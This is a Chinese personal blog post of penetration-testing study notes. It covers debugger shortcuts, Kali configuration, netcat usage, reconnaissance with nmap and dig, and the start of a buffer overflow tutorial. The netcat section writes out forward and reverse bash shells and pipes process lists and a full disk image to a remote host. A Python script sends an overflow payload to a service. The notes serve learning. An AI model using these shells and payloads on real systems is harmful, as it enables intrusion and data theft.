href="#%E5%87%BD%E6%95%B0"><span class="nav-number">7.2.38.2.</span> <span class="nav-text">函数</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows-API-1"><span class="nav-number">8.</span> <span class="nav-text">Windows API</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B"><span class="nav-number">8.1.</span> <span class="nav-text">案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86"><span class="nav-number">8.1.1.</span> <span class="nav-text">基础部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DLL-%E6%B3%A8%E5%85%A5"><span class="nav-number">8.1.2.</span> <span class="nav-text">DLL 注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows-%E5%86%85%E6%A0%B8"><span class="nav-number">9.</span> <span class="nav-text">Windows 内核</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Peng</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">51</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">64</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://withz.github.io/2020/09/20/%E5%AE%89%E5%85%A8/Kali/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Peng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Withz">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="网络安全学习 | Withz">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          网络安全学习
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-09-20 12:45:18" itemprop="dateCreated datePublished" datetime="2020-09-20T12:45:18+08:00">2020-09-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-06-07 10:52:59" itemprop="dateModified" datetime="2024-06-07T10:52:59+08:00">2024-06-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>…</p>
<span id="more"></span>

<h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><p>网络安全：要求数据在互联网上：真实，可靠，完整，可控的传输与存储。</p>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p>快捷键：</p>
<ul>
<li><p>Space 切换 列表 图形 视图</p>
</li>
<li><p>F5 切换 伪代码</p>
</li>
<li><p>Tab 补全命令</p>
</li>
<li><p>双击 跳转到定义</p>
</li>
<li><p>X 跳转到引用</p>
</li>
<li><p>G 跳转到地址</p>
</li>
<li><p>Ctrl + E 查看入口</p>
</li>
<li><p>Ctrl + S 跳转到段 &#x2F; 搜索</p>
</li>
<li><p>Alt + T 打开文本搜索对话框</p>
</li>
<li><p>Alt + I 搜索立即数</p>
</li>
<li><p>Alt + B 搜索二进制</p>
</li>
<li><p>Shift + F12 打开字符串窗口</p>
</li>
<li><p>Alt + M 添加书签</p>
</li>
<li><p>Ctrl + M 列出所有书签</p>
</li>
<li><p>Ctrl + Alt + B 列出断点列表</p>
</li>
<li><p>F7 单步进入</p>
</li>
<li><p>F8 单步跳过</p>
</li>
<li><p>Ctrl + F7 运行到函数返回地址</p>
</li>
<li><p>F4 运行到光标处</p>
</li>
<li><p>R ASCII 数字 切换显示</p>
</li>
<li><p>H 十进制 十六进制 切换显示</p>
</li>
<li><p><code>;</code> 注释 交叉参考处显示</p>
</li>
<li><p><code>:</code> 注释 只在该处显示</p>
</li>
<li><p><code>-/+</code> 合并&#x2F;展开 可视化视图</p>
</li>
<li><p>Ctrl + Enter 下一项</p>
</li>
<li><p>N 重命名</p>
</li>
<li><p>Y 修改 函数签名 或 变量类型</p>
</li>
<li><p>D 数据类型转化 byte word dword qword</p>
</li>
<li><p><code>*</code> 转化 变量 为 数组</p>
</li>
<li><p>Alt + * 设置数组大小</p>
</li>
<li><p>A 转化为 字符串首地址</p>
</li>
<li><p>Alt + A 设置字符串编码格式</p>
</li>
<li><p>Shift + S 创建结构体</p>
</li>
</ul>
<h3 id="OD"><a href="#OD" class="headerlink" title="OD"></a>OD</h3><p>快捷键：</p>
<ul>
<li><p>Ctrl + F2 重启程序</p>
</li>
<li><p>Alt + F2 关闭程序</p>
</li>
<li><p>F3 打开程序</p>
</li>
<li><p>Alt + F5 OD总在最前</p>
</li>
<li><p>Alt + B 断点窗口</p>
</li>
<li><p>Alt + C CPU窗口</p>
</li>
<li><p>Alt + E 模块列表</p>
</li>
<li><p>Alt + K 调用栈</p>
</li>
<li><p>Alt + L 日志</p>
</li>
<li><p>Alt + M 内存</p>
</li>
<li><p>Alt + O 选项</p>
</li>
<li><p>Alt + X 关闭 OD</p>
</li>
<li><p>Ctrl + P 补丁窗口</p>
</li>
<li><p>Ctrl + T RUN 对话框</p>
</li>
<li><p>F10 打开快捷菜单</p>
</li>
<li><p>Enter 将当前命令添加到历史</p>
</li>
<li><p>Backspace 移除该部分的自动分析信息</p>
</li>
<li><p>Alt + Backspace 撤销</p>
</li>
<li><p>Ctrl + A 分析当前代码</p>
</li>
<li><p>Ctrl + B 二进制搜索</p>
</li>
<li><p>Ctrl + C 复制</p>
</li>
<li><p>Ctrl + E 二进制编辑</p>
</li>
<li><p>Ctrl + F 命令搜索</p>
</li>
<li><p>Ctrl + G 跳转到地址</p>
</li>
<li><p>Ctrl + J 列出相关的调用和跳转</p>
</li>
<li><p>Ctrl + K 查看调用树</p>
</li>
<li><p>Ctrl + L 搜索下一个</p>
</li>
<li><p>Ctrl + N 打开名称列表</p>
</li>
<li><p>Ctrl + O 扫描Object</p>
</li>
<li><p>Ctrl + R 搜索所选命令</p>
</li>
<li><p>Ctrl + S 命令搜索</p>
</li>
<li><p>Space 修改命令</p>
</li>
<li><p>F2 切换断点</p>
</li>
<li><p>F4 执行到这一行</p>
</li>
<li><p>Shift + F4 设置记录断点</p>
</li>
<li><p>F7 单步进入</p>
</li>
<li><p>F8 单步跳过</p>
</li>
<li><p>F9 运行到断点</p>
</li>
<li><p>Alt + F9 执行到返回用户代码段</p>
</li>
<li><p>F12 停止执行</p>
</li>
<li><p>Esc 停止自动跟踪</p>
</li>
</ul>
<p>命令插件：</p>
<ul>
<li>calc 判断表达式</li>
<li>watch 监视表达式</li>
<li>at 跳转到地址</li>
<li>orig 反汇编与EIP</li>
<li>dump 转存</li>
<li>da 转存为反汇编</li>
<li>db 16进制转存</li>
<li>dc ASCII 转存</li>
<li>dd 存入堆栈</li>
<li>du unicode 转存</li>
<li>dw word 转存</li>
<li>bp 下断点</li>
<li>bpd 清除全部调用中的断点</li>
<li>bc 清除断点</li>
<li>brk 查看断点窗口</li>
<li>opt 打开选项设置窗口</li>
<li>rst 重新运行当前程序</li>
<li>help 查看 API 函数的帮助</li>
</ul>
<h2 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h2><h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h3><h3 id="PWNDGB"><a href="#PWNDGB" class="headerlink" title="PWNDGB"></a>PWNDGB</h3><h1 id="Kali-渗透测试"><a href="#Kali-渗透测试" class="headerlink" title="Kali 渗透测试"></a>Kali 渗透测试</h1><h2 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h2><p><a target="_blank" rel="noopener" href="http://www.pentest-standard.org/">PETS</a>：</p>
<ul>
<li>前期交互，获取范围，一次一个系统</li>
<li>情报收集，安全防护机制</li>
<li>威胁建模</li>
<li>漏洞分析</li>
<li>渗透攻击</li>
<li>后渗透测试</li>
<li>报告</li>
</ul>
<h2 id="定制系统"><a href="#定制系统" class="headerlink" title="定制系统"></a>定制系统</h2><h3 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h3><p>强制DHCP客户端请求IP</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dhclient eth0</span><br></pre></td></tr></table></figure>

<p>临时自定义IP</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置 IP 和 网关</span></span><br><span class="line">ifconfig eth0 192.168.0.102/24</span><br><span class="line">route add default gw 192.168.0.1 <span class="comment"># gw: Gate Way</span></span><br><span class="line"><span class="comment"># 添加静态路由</span></span><br><span class="line">route add -net 192.168.0.0/24 gw 192.168.0.1 eht0</span><br><span class="line"><span class="comment"># 配置 DNS (永久保存)</span></span><br><span class="line"><span class="built_in">echo</span> nameserver 192.168.0.1&gt;/etc/resolv.conf</span><br></pre></td></tr></table></figure>

<p>设置永久IP</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/network/interfaces</span><br><span class="line"><span class="comment"># 默认</span></span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"><span class="comment"># 改为 静态</span></span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.0.102</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.0.1</span><br><span class="line">dns-nameservers 192.168.0.1</span><br><span class="line"><span class="comment"># up 当网卡启动后执行</span></span><br><span class="line">up route add -net 192.168.0.0/24 gw 192.168.0.1 eth0</span><br><span class="line"><span class="comment"># down 当网卡卸载后执行</span></span><br><span class="line">down route del -net 192.168.0.0/24 </span><br></pre></td></tr></table></figure>

<h3 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h3><p>切换更新源</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span><br></pre></td></tr></table></figure>

<p>更新软件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get update --fix-missing</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get dist-upgrade  <span class="comment"># 大版本升级</span></span><br></pre></td></tr></table></figure>

<h3 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>Firefox</p>
<ul>
<li>autoproxy  代理 </li>
<li>Tamper Data  HTTP 包 查看 修改</li>
<li>cookie importer  导入Cookie</li>
<li>Cookies Manager  管理Cookie</li>
<li>User Agent Switcher  修改浏览器特征</li>
<li>HackBar  F9  注入，参数修改，Post等</li>
<li>Live http header  拦截 HTTP 头</li>
<li>Firebug  调试</li>
<li>Flagfox  显示国籍</li>
<li>hashr  计算哈希</li>
<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/xss-me/">xss me</a>  自动化跨站脚本攻击</li>
<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/?src=ss">sql inject me</a>  SQL 注入</li>
</ul>
<h3 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h3><h4 id="NC-NETCAT"><a href="#NC-NETCAT" class="headerlink" title="NC - NETCAT"></a>NC - NETCAT</h4><ul>
<li>侦听 传输 模式</li>
<li>Telnet 获取 banner</li>
<li>传输文本</li>
<li>传输文件</li>
<li>加密传输文件</li>
<li>远程控制</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
</ul>
<p>但是NCAT是明文传输，会被嗅探到。</p>
<p>当作 Telnet 使用</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -v 显示详细输出内容 </span></span><br><span class="line"><span class="comment"># -n 不进行DNS解析</span></span><br><span class="line">nc -nv 192.168.0.102 80</span><br></pre></td></tr></table></figure>

<p>侦听端口</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -l 侦听</span></span><br><span class="line">nc -l -p 9001 </span><br><span class="line">nc -l -p 9001 &gt; ps.txt</span><br><span class="line"><span class="comment"># 收集信息</span></span><br><span class="line">ps aux | nc -nv 192.168.0.1 3333 -q 1 <span class="comment"># -q 等待 1 秒退出</span></span><br></pre></td></tr></table></figure>

<p>传输文件目录</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接收</span></span><br><span class="line">nc -lp 3333 &gt; main.mp4</span><br><span class="line">nc -nv 192.168.0.1 3333 &lt; main.mp4 -q 1</span><br><span class="line"><span class="comment"># 发送</span></span><br><span class="line">nc -q 1 -lp 3333 &lt; main.mp4</span><br><span class="line">nc -nv 192.168.0.1 3333 &gt; main.mp4</span><br><span class="line"><span class="comment"># 传输目录</span></span><br><span class="line">tar -cvf - music/ | nc -lp 3333 -q 1 <span class="comment"># 打包目录</span></span><br><span class="line">nc -nv 192.168.0.1 3333 | tar -xvf - <span class="comment"># 解包目录</span></span><br></pre></td></tr></table></figure>

<p>流媒体</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.mp4 | nc -lp 3333</span><br><span class="line">nc -nv 192.168.0.1 3333 | mplayer -vo x11 -cache 3000 - </span><br></pre></td></tr></table></figure>

<p>端口扫描</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz 192.168.0.1 1-65535  <span class="comment"># TCP</span></span><br><span class="line">nc -nvzu 192.168.0.1 1-65535 <span class="comment"># UDP</span></span><br></pre></td></tr></table></figure>

<p>硬盘克隆</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 3333 | <span class="built_in">dd</span> of=/dev/sda</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/sda | nc -nv 192.168.0.1 3333 -q 1</span><br></pre></td></tr></table></figure>

<p>远程控制</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正向</span></span><br><span class="line">nc -lp 3333 -c bash</span><br><span class="line">nc 192.168.0.1 3333</span><br><span class="line"><span class="comment"># 反向</span></span><br><span class="line">nc -lp 3333 </span><br><span class="line">nc 192.168.0.1 3333 -c bash</span><br></pre></td></tr></table></figure>

<h4 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h4><p>由于NC缺乏加密能力，因此可以使用Ncat。</p>
<p>加密连接</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat -c bash --allow 192.168.20.14 -vnl 3333 -ssl</span><br><span class="line">ncat -nv 192.168.0.102 3333 -ssl</span><br></pre></td></tr></table></figure>

<h4 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> content</span><br><span class="line"><span class="comment"># Ctrl + D 计算</span></span><br></pre></td></tr></table></figure>


<h3 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h3><ul>
<li>ibus 输入法</li>
<li>Java </li>
<li>笔记本模式</li>
<li>并发线程限制：限制当前shell内进程资源<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看默认值</span></span><br><span class="line"><span class="built_in">ulimit</span> -a </span><br><span class="line"><span class="comment"># 限制堆栈</span></span><br><span class="line"><span class="built_in">ulimit</span> -s 100</span><br><span class="line"><span class="comment"># 限制内存</span></span><br><span class="line"><span class="built_in">ulimit</span> -m 5000 -v 5000</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><p>公开渠道可获取的信息，不与目标系统接触。基于媒体，搜索引擎等。<br><a target="_blank" rel="noopener" href="http://www.fas.org/irp/doddir/army/atp2-22-9.pdf">资料1</a><br><a target="_blank" rel="noopener" href="http://information-retrieval.info/docs/NATO-OSINT.html">资料2</a></p>
<h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>FQDN：主机名是bigserver，域名是mycompany.com，那么FQDN就是bigserver.mycompany.com。</p>
<p>记录类型：</p>
<ul>
<li>C NAME - 解析为其他域名</li>
<li>A &#x2F; NS - 域名解析为IP </li>
<li>PTR - IP解析为域名</li>
</ul>
<p>NS LOOKUP</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.sina.com.cn</span><br><span class="line"><span class="comment"># 找到 A 记录</span></span><br><span class="line">&gt; <span class="built_in">set</span> <span class="built_in">type</span>=a <span class="comment"># 只查A记录</span></span><br><span class="line">&gt; <span class="built_in">set</span> <span class="built_in">type</span>=mx <span class="comment"># 查MX记录  邮件交换记录</span></span><br><span class="line">&gt; sina.com </span><br><span class="line"></span><br><span class="line"><span class="comment"># -q 同 -typq</span></span><br><span class="line">nslookup -q=any 163.com</span><br><span class="line">nslookup 163.com -q=any 114.114.114.114</span><br></pre></td></tr></table></figure>

<p>DIG</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig 163.com any</span><br><span class="line">dig 163.com any @8.8.8.8</span><br></pre></td></tr></table></figure>

<h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><p>Banner 搜索，但是准确度不可靠。</p>
<ul>
<li>nc</li>
<li>Python 通过 Socket 发起连接获取 Banner</li>
<li>dmitry </li>
<li>nmap 通过 banner 脚本实现</li>
<li>amap 专门用来发现服务<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nc -nv x.x.x.x 22</span><br><span class="line"><span class="comment"># 输出 Banner</span></span><br><span class="line"><span class="comment"># SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p tcp port , b read banner</span></span><br><span class="line">dmitry -pd x.x.x.x</span><br><span class="line"></span><br><span class="line"><span class="comment"># sT 完整 TCP -p端口范围</span></span><br><span class="line"><span class="comment"># 脚本目录  /usr/share/nmap/script</span></span><br><span class="line">nmap -sT x.x.x.x -p1-100 --script=banner.nse</span><br><span class="line"></span><br><span class="line">amap -B x.x.x.x 21</span><br><span class="line">amap -B x.x.x.x 1-100</span><br><span class="line">amap -B x.x.x.x 1-100 | grep on</span><br></pre></td></tr></table></figure></li>
</ul>
<p>Nmap 可以根据特征库识别目标系统和服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 依据特征识别</span></span><br><span class="line">nmap x.x.x.x -p1-100 -sV</span><br><span class="line">amap x.x.x.x 1-100 -qb</span><br></pre></td></tr></table></figure>

<h3 id="操作系统扫描"><a href="#操作系统扫描" class="headerlink" title="操作系统扫描"></a>操作系统扫描</h3><p>依据TTL，默认值，不准确</p>
<ul>
<li>Windows 65-128</li>
<li>Linux Unix 1-64</li>
<li>某些Unix 255</li>
</ul>
<p>使用Nmap</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O x.x.x.x</span><br></pre></td></tr></table></figure>

<p>专门用来识别操作系统的工具，不如Nmap</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xprobe2 x.x.x.x</span><br></pre></td></tr></table></figure>

<p>被动扫描方式：<br>部署在网络出口，通过网络抓包，镜像端口等方式。</p>
<p>SNMP 扫描：</p>
<ul>
<li>简单网络管理协议</li>
<li>监控网络设备的CPU 内存 网络带宽 等</li>
<li>默认是public，容易被渗透<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>CVSS：通用漏洞评分系统。（一种工业标准）</p>
<ul>
<li>版本 V3.1</li>
<li>类别<ul>
<li>Basic - 基本</li>
<li>Temporal - 依赖时间因素</li>
<li>Enviromental - 利用环境</li>
</ul>
</li>
</ul>
<p>CVE 管理组织，负责漏洞编号。<br>各个厂商也会自己编号。</p>
<p>OVAL 开放漏洞描述语言：XML语言。</p>
<ul>
<li>描述漏洞，可以被扫描器存储。</li>
</ul>
<p>CCE 描述软件缺陷的标准化格式。</p>
<p>CPE 软件，硬件，其他设备 命名编号格式。</p>
<p>CWE 通用弱点描述，只做类型分类。</p>
<p>SCAP 集合多种安全标准的框架，包含上述标准。</p>
<ul>
<li>便于管理，测量，量化。</li>
<li>将复杂系统配置自动化。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/">NVD</a> 美国国家漏洞库。</p>
<h3 id="手工查询"><a href="#手工查询" class="headerlink" title="手工查询"></a>手工查询</h3><p>漏洞库：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">地址1</a>，由Kali维护。<a target="_blank" rel="noopener" href="https://www.rapid7.com/">地址2</a>，由Rapid7维护。</p>
<p>或本地库搜索</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit tomcat</span><br><span class="line"><span class="comment"># /usr/share/exploitdb/exploits/</span></span><br><span class="line"><span class="comment"># 攻击脚本地址</span></span><br><span class="line"><span class="comment"># /usr/share/exploitdb/shellcodes</span></span><br></pre></td></tr></table></figure>

<p>或工具sandi-gui </p>
<h3 id="弱点扫描器"><a href="#弱点扫描器" class="headerlink" title="弱点扫描器"></a>弱点扫描器</h3><p>主动扫描：</p>
<ul>
<li>有身份验证</li>
<li>无身份验证</li>
</ul>
<p>被动扫描：</p>
<ul>
<li>镜像抓包</li>
<li>其他来源输入</li>
</ul>
<p>基于Agent扫描：</p>
<ul>
<li>应用场景受限</li>
</ul>
<p>Nmap</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 脚本位置</span></span><br><span class="line"><span class="comment"># /usr/share/nmap/scripts</span></span><br></pre></td></tr></table></figure>

<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><p>漏洞来源：数据与程序的边界不清。</p>
<p>例如：Shell脚本。</p>
<p>挖掘漏洞：</p>
<ul>
<li>源码审计</li>
<li>逆向工程</li>
<li>模糊测试：利用调试工具，发送任意包注入</li>
</ul>
<h3 id="Linux-缓冲区溢出"><a href="#Linux-缓冲区溢出" class="headerlink" title="Linux 缓冲区溢出"></a>Linux 缓冲区溢出</h3><p>调试工具：EDB</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edb --run target</span><br></pre></td></tr></table></figure>

<p>探测溢出：</p>
<ol>
<li>需要关注EIP。</li>
<li>尝试不同长度的数据填充，直到溢出，改变EIP。一旦发生溢出，EDB会报错。</li>
<li>如果EIP被修改为填充数据，则表示可以利用。如果被修改为其他数据，则无法利用。</li>
</ol>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 探测脚本</span></span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line">host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">crash = <span class="string">&#x27;\x41&#x27;</span> * <span class="number">4379</span></span><br><span class="line"><span class="comment"># \x11 设备1调用的指令代号：传输开始  \x90 NOP  \x00</span></span><br><span class="line">buffer = <span class="string">&#x27;\x11(setup sound&#x27;</span> + crash + <span class="string">&#x27;\x90\x00#&#x27;</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Start to send&quot;</span>)</span><br><span class="line">s.connect((host, <span class="number">13327</span>))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;End&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>寻找溢出位置：</p>
<ol>
<li>使用唯一的填充字符串，填充缓冲区。</li>
<li>通过查看EIP被修改的数据定位溢出位置。</li>
</ol>
